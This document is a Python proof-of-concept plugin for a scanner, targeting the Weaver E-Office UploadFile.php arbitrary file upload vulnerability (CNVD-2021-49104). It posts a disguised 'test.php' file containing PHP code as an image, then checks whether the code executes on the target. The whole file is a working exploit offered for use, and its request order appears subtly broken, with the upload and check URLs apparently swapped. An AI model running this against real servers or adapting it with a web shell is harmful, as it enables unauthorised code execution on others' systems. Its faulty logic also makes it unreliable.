#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '泛微OA E-Office UploadFile.php 任意文件上传漏洞 CNVD-2021-49104',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Cookie': 'LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348',
      'Content-Length': '193',
      'Content-Type':'multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4',
      }
  target = '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
  data = '''
    --e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: image/jpeg

<?php phpinfo();?>

--e64bdf16c554bbc109cecef6451c26a4--

  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url+'/images/logo/logo-eoffice.php',headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "logo-eoffice.php" in res.text:
      resp = requests.get(url=url1,headers=headers,timeout=5,verify=False)
      if resp.status_code == 200 and 'phpinfo()' in resp.text:
        # ret['huixian'] = res.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret